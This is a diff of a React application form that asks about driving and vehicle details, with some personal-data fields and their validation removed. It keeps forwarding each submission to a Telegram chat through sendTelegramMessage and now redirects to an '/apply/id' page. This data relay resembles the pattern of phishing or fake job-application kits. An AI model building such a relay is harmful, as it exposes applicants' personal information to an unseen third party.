@@ -26,13 +26,7 @@ const PersonalInformationForm = () => {
 
   const validateForm = () => {
     const newErrors: Record<string, string> = {};
-    if (!formData.firstName.trim()) newErrors.firstName = "First name is required";
-    if (!formData.lastName.trim()) newErrors.lastName = "Last name is required";
-    if (!formData.dob) newErrors.dob = "Date of Birth is required";
-    if (!formData.email.trim()) newErrors.email = "Email is required";
-    if (formData.email !== formData.confirmEmail) newErrors.confirmEmail = "Emails do not match";
-    if (!formData.phoneNumber.trim()) newErrors.phoneNumber = "Phone Number is required";
-    if (!formData.gender) newErrors.gender = "Gender is required";
+    
     if (formData.drives === "") newErrors.drives = "Please specify if you drive"; // New error check
     if (formData.drives === "Yes") {
       if (!formData.vehicleName.trim()) newErrors.vehicleName = "Vehicle Name and Model is required"; // Vehicle validation
@@ -44,6 +38,7 @@ const PersonalInformationForm = () => {
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
+    console.log("Form Submitted");
     e.preventDefault();
     
     const validationErrors = validateForm();
@@ -57,12 +52,7 @@ const PersonalInformationForm = () => {
 
     // Send the form data to Telegram
     const message = `New User Form Submission:\n
-    First Name: ${formData.firstName}\n
-    Last Name: ${formData.lastName}\n
-    Date of Birth: ${formData.dob}\n
-    Email: ${formData.email}\n
-    Gender: ${formData.gender}\n
-    Phone Number: ${formData.phoneNumber}\n
+   
     Drives: ${formData.drives}\n
     Vehicle Type: ${formData.vehicleType}\n
     Vehicle Name and Model: ${formData.vehicleName}\n
@@ -73,7 +63,7 @@ const PersonalInformationForm = () => {
     await sendTelegramMessage(message);
 
     // Redirect to the next page
-    router.push("/education-history");
+    router.push("/apply/id");
   };
 
   return (
@@ -129,7 +119,7 @@ const PersonalInformationForm = () => {
                   <input
                     value={formData.drivingExperience}
                     onChange={(e) => setFormData({ ...formData, drivingExperience: e.target.value })}
-                    className={`w-full mt-2 border ${errors.drivingExperience ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
+                    className={`text-black bg-white w-full mt-2 border ${errors.drivingExperience ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
                     placeholder="e.g., 5 years"
                   />
                   {errors.drivingExperience && <p className="text-red-500 text-sm mt-1">{errors.drivingExperience}</p>}
@@ -183,7 +173,7 @@ const PersonalInformationForm = () => {
                   <input
                     value={formData.vehicleName}
                     onChange={(e) => setFormData({ ...formData, vehicleName: e.target.value })}
-                    className={`w-full mt-2 border ${errors.vehicleName ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
+                    className={`text-black bg-white w-full mt-2 border ${errors.vehicleName ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
                   />
                   {errors.vehicleName && <p className="text-red-500 text-sm mt-1">{errors.vehicleName}</p>}
                 </div>
